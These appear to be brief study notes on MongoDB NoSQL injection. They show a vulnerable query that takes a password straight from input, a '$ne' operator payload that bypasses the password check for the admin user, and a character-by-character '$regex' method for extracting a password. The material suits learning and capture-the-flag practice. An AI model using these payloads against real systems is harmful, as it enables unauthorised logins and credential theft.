#sqli #mongo 

# Not Equal

### Code
```php
users.findOne({"info.name": "admin", "info.password": $pass})
```

### Injection
```
$pass = {"$ne": "test"}
```

### Result
Return users that are Not Equal to “test”. 
```php
users.findOne({"info.name": "admin", "info.password": {"$ne": "test"}})
```


# Regex - Exfiltrate Password

```
{"$regex": "A"} -> False
{"$regex": "F"} -> True

{"$regex": "FA"} -> False
{"$regex": "FL"} -> True

{"$regex": "FLA"} -> True
```
